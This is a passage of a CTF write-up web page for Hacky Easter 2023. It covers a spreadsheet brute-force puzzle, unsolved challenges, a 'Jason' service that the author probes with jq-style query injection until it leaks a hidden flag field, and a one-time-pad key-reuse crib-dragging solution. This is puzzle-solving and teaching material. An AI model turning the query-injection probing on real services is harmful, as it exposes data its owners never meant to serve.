</span>          <span class="n">d5</span> <span class="o">=</span> <span class="p">(</span><span class="n">e2</span><span class="o">+</span><span class="n">j6</span><span class="o">+</span><span class="n">b7</span><span class="o">+</span><span class="n">d14</span><span class="o">+</span><span class="n">g14</span><span class="p">)</span> <span class="o">%</span> <span class="mi">64</span>
          <span class="n">f4</span> <span class="o">=</span> <span class="p">(</span><span class="n">e2</span><span class="o">*</span><span class="n">g14</span><span class="o">+</span><span class="n">d14</span><span class="o">+</span><span class="n">j6</span><span class="p">)</span>    <span class="o">%</span> <span class="mi">64</span>
          <span class="n">j3</span> <span class="o">=</span> <span class="p">(</span><span class="n">f12</span><span class="o">+</span><span class="n">d11</span><span class="o">+</span><span class="n">d5</span><span class="o">+</span><span class="n">f4</span><span class="p">)</span>    <span class="o">%</span> <span class="mi">64</span>

          <span class="k">if</span> <span class="n">b5</span> <span class="o">==</span> <span class="mi">52</span> <span class="ow">and</span> <span class="n">i7</span> <span class="o">==</span> <span class="mi">57</span> <span class="ow">and</span> <span class="n">j3</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
            <span class="n">options</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">d14: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">d14</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s"> b7: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">b7</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s"> e2: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">e2</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s"> g14: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">g14</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s"> j6: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">j6</span><span class="p">))</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Options: </span><span class="sh">"</span><span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">options</span><span class="p">))</span>
</pre></table></code></div></div><p>and this leaves us with just 1 option for input cells:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>D14: 1
B7:  2
E2:  8
G14: 5
J6:  8
</pre></table></code></div></div><p>And when we fill that in our spreadsheet, we get the full flag:</p><p><img src="writeupfiles/kaos-solution.png" alt="" /></p><h2> Flag</h2><code> he2023{Th4tSKa0Z!} </code><hr><h1 id="this-one-goes-to-11"> This One Goes To 11 <a href="/writeups/HackyEaster_2023/level8-1-this-one-goes-to-11.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>So tell me, how do I escape hell, wise man?</p><p>Connect to the server.</p><p><code class="language-plaintext highlighter-rouge">nc ch.hackyeaster.com 2309</code></p><p><a href="writeupfiles/hell">hell</a></p><p><em><strong>Hint:</strong> Non est facilis labor fugere infernum, quia est fundamentum omnis mali ac nequitiarum. Solum ultima tua clamor te liberabit ex hoc loco. Sed ante te volvendus campis ad sinistram et ad dexteram et evadendus insidias mali Xorxis. Sed ne putes id facile fore, qui victoriam quaerit, oportet ei mentem habere quid in hoc labore vero est momenti.</em></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>this is found in the strings, and, unsurprisingly, is not it.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>HE23{H3ll_a1nt_a_b@d_pl@c3!h377_i$_fr0m_h343_t0_3t3erni7y}
</pre></table></code></div></div><p>But maybe the online version of the program has the real flag there, we just need to figure out how to make the program give it to us?</p><h2> Flag</h2><code> unsolved </code><hr><h1 id="thumper-s-pwn-1"> Thumper's PWN 1 <a href="/writeups/HackyEaster_2023/level8-2-thumpers-pwn-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Thumper has finally reached the innermost ring. He’s given one last task to complete. You need to get a passing average to get the flag.</p><p>Target: <code class="language-plaintext highlighter-rouge">nc ch.hackyeaster.com 2315</code></p><p><a href="writeupfiles/thumperspwn1.zip">thumperspwn1.zip</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="jason"> Jason <a href="/writeups/HackyEaster_2023/level8-3-jason.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Jason has implemented an information service.</p><p>He has hidden a flag in it, can you find it?</p><p>Connect to the server:</p><p><code class="language-plaintext highlighter-rouge">nc ch.hackyeaster.com 2304</code></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Ahh the name should’ve been a give away huh? It took me a minute nonetheless</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>&gt; 1/2
Result: 0.05
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt; 20/1
Result: 0.2
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt; 200/1
Result: 0.2
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt; 1 + 1
Result: 1.1
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt; 1 + 1 + 1
Result: 2.1
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
</pre></table></code></div></div><p>From the above I finally understood it must be prepending <code class="language-plaintext highlighter-rouge">.</code> to the queries, and since it’ll process math, we can use it as an annoying calculator. But the key realisation is the <code class="language-plaintext highlighter-rouge">.</code> is prepended.</p><p>So we can try some other JSON access things like you’d do with <code class="language-plaintext highlighter-rouge">jq</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>&gt; []
Result: "Jason"
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt; [][0]
Something went wrong.
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt; [0]
Something went wrong.
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt; [1]
Something went wrong.
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt; {}
Invalid input!
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
</pre></table></code></div></div><p>Ahh <code class="language-plaintext highlighter-rouge">keys</code> works</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre>&gt;  | to_entries
Result: [
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt;  | to_keys
Something went wrong.
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt; keys
Result: null
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt;  | .keys
Result: null
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt;  | keys
Result: [
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt;  | keys | .[0]
Result: "city"
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt;  | keys | .[1]
Result: "country"
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt;  | keys | .[2]
Result: "covert"
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt;  | keys | .[3]
Result: "name"
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt;  | keys | .[4]
Result: "street"
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt;  | keys | .[5]
Result: "surname"
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt;  | keys | .[6]
Result: null
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt; covert
Result: {
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
</pre></table></code></div></div><p>and covert looks interesting!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>&gt; covert | keys | .[0]
Result: "flag"
&gt; enter "name", "surname", "street", "city", "country", or "q" to quit
&gt; covert.flag
Result: "he2023{gr3pp1n_d4_js0n_l1k3_4_pr0!}"
</pre></table></code></div></div><p>it can’t be this easy?</p><h2> Flag</h2><code> he2023{gr3pp1n_d4_js0n_l1k3_4_pr0!} </code><hr><h1 id="the-little-rabbit"> The Little Rabbit <a href="/writeups/HackyEaster_2023/level8-4-the-little-rabbit.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Oh no! Someone encrypted my poem, using a One-Time-Pad.</p><p>Good news: Each line was encrypted individually, with the same key.</p><p>Bad news: The plaintext was changed somehow, before encryption.</p><p><a href="writeupfiles/cipher.txt">cipher.txt</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div file="crypto.txt" class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="crypto.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>The Little Rabbit Ohaal

626b34041c11143a444e1b342c0e341036592d39044a0c102505145b57030c1b0e15290a533231071f71040465221023026b
7a2a304a14115a311d5b4d3d320e66520a11392e124a1000621a414310014e070245350f147431150a7105142273103a4328132f01181e
733e334a0615513203170a263d1632100f506c3f1d18461c2015554316074e1f1c47264c257427061f71080a2273103a4328043c47
626b2b081412463144411e733e0574004b0237280d5b09393315004103050f2a5d6a240943272513592c4a142373153c11670534050d1e
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">Ohaal</code> in the file is rot13 for <code class="language-plaintext highlighter-rouge">Bunny</code>, so we’re likely looking for rot13’d plaintext?</p><p>We try a cribdragging approach but look for rot13 words instead of plain English</p><p>The challenge mentions a poem, so it seems likely the last line contains our flag.</p><p>We us an online <a href="https://toolbox.lotusfa.com/crib_drag/">crib-dragging tool</a>, and since it only works for pairs of ciphertexts, we open a window for each combination of lines that involves the 4th line, since we are primarily interested in the flag.</p><p><strong>Step 1</strong></p><p>We start by trying the crib <code class="language-plaintext highlighter-rouge">he2023{</code> (we need to provide it in ROT13, so we use <code class="language-plaintext highlighter-rouge">ur2023{</code>) and see if we get anything that looks like it might be valid ROT13 text</p><p>Here is a screenshot of the online tool we used:</p><p><img src="writeupfiles/ohaal-ss.png" alt="" /></p><p>And this crib gives us the following results</p><p><img src="writeupfiles/ohaal-results.png" alt="" /></p><p>Among the results we see <code class="language-plaintext highlighter-rouge">ggyr Oha</code>, which looks potentiall like RO13 English? And indeed, ROT13 of that is <code class="language-plaintext highlighter-rouge">ttle Bun</code> ..could very well be “little Bunny”! (“Ohaal” was also in our ciphertext file!). We set that as part of output 1 (since we theorized the fourth line, here output 2, contains the crib we used)</p><p><strong>Step 2</strong></p><p>Next we guess that the plaintext is indeed <code class="language-plaintext highlighter-rouge">little Bunny</code>, ROT13 that (<code class="language-plaintext highlighter-rouge">yvggyr Ohaal</code>), and now use that as the crib, so that hopefully we can reveal some of the letters around our <code class="language-plaintext highlighter-rouge">he2023{</code> string:</p><p><img src="writeupfiles/ohaal-step2.png" alt="" /></p><p>We see that <code class="language-plaintext highlighter-rouge">vs ur2023{pe1</code> is among the results, which is <code class="language-plaintext highlighter-rouge">is he2023{cr1</code> ROT13 decoded, that looks promising!</p><p><strong>Step 3</strong></p><p>We can keep guessing here, maybe <code class="language-plaintext highlighter-rouge">is he2023{cr1</code> -&gt; <code class="language-plaintext highlighter-rouge">flag is he2023{cr1b</code>? ..but we can also fill in what we know using one of the other ciphertext lines</p><p>For example, using a combination of line 2 and 4, and using <code class="language-plaintext highlighter-rouge">vs ur2023{pe1</code> as a crib, we get a result of <code class="language-plaintext highlighter-rouge">l nyy bs uvz</code> which translates to <code class="language-plaintext highlighter-rouge">y all of him</code></p><p><strong>Step 4</strong></p><p>We continue in this way until we slowly reveal all the plaintext, doing this for the various different combinations of cipher text lines simultaneously, slowly extending and guessing more plaintext, seeing if it works in the other encrypted lines.</p><p><strong>Final</strong></p><p>After a while we are able to fully decrypt the 4 messages:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>626b34041c11143a444e1b342c0e341036592d39044a0c102505145b57030c1b0e15290a533231071f71040465221023026b
v unir n yvggyr Ohaal jvgu n pbng nf fbsg nf qbja
i have a little Bunny with a coat as soft as down

7a2a304a14115a311d5b4d3d320e66520a11392e124a1000621a414310014e070245350f147431150a7105142273103a4328132f01181e
naq arneyl nyy bs uvz vf juvgr rkprcg bar ovg bs oebja
and nearly all of him is white except one bit of brown

733e334a0615513203170a263d1632100f506c3f1d18461c2015554316074e1f1c47264c257427061f71080a2273103a4328043c47
gur svefg guvat va gur zbeavat jura V trg bhg bs orq
the first thing in the morning when I get out of bed

626b2b081412463144411e733e0574004b0237280d5b09393315004103050f2a5d6a240943272513592c4a142373153c11670534050d1e
v jbaqre vs ur2023{pe1o_qe4ttva_4_ce0svg!} vf gur synt
i wonder if he2023{cr1b_dr4ggin_4_pr0fit!} is the flag
</pre></table></code></div></div><h2> Flag</h2><code> he2023{cr1b_dr4ggin_4_pr0fit!} </code><hr></div><script> document.addEventListener("DOMContentLoaded", () => { console.log("Hello World!"); tocbot.init({ tocSelector: '#toc', contentSelector: '.post-content', ignoreSelector: '[data-toc-skip]', headingSelector: 'h1', orderedList: false, scrollSmooth: false, }); }); </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li> <a href="/posts/text-and-typography/">Text and Typography</a><li> <a href="/posts/write-a-new-post/">Writing a New Post</a><li> <a href="/posts/getting-started/">Getting Started</a><li> <a href="/posts/customize-the-favicon/">Customize the Favicon</a><li> <a href="/posts/enable-google-pv/">Enable Google Page Views</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tag/image/">image</a> <a class="post-tag" href="/tag/rsa/">RSA</a> <a class="post-tag" href="/tag/lsb/">LSB</a> <a class="post-tag" href="/tag/cipher/">cipher</a> <a class="post-tag" href="/tag/pcap/">pcap</a> <a class="post-tag" href="/tag/audio/">audio</a> <a class="post-tag" href="/tag/aws/">aws</a> <a class="post-tag" href="/tag/bash/">bash</a> <a class="post-tag" href="/tag/binwalk/">binwalk</a> <a class="post-tag" href="/tag/crib-dragging/">crib dragging</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tag/image/">image</a> <a class="post-tag" href="/tag/rsa/">RSA</a> <a class="post-tag" href="/tag/lsb/">LSB</a> <a class="post-tag" href="/tag/cipher/">cipher</a> <a class="post-tag" href="/tag/pcap/">pcap</a> <a class="post-tag" href="/tag/audio/">audio</a> <a class="post-tag" href="/tag/aws/">aws</a> <a class="post-tag" href="/tag/bash/">bash</a> <a class="post-tag" href="/tag/binwalk/">binwalk</a> <a class="post-tag" href="/tag/crib-dragging/">crib dragging</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/shiltemann">Team Galaxians</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false" ><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script defer src="/assets/js/dist/commons.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
